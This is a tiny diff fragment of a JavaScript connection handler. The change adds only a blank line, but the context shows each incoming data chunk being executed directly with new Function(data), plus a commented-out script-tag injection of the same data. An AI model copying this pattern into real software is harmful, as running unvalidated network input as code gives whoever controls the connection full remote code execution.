@@ -21,6 +21,7 @@ conn.on('data', (data) => {
     let run = new Function(data)
     run()
     
+    
     //document.innerHTML = `<script>${data}</script>`
 });}
 
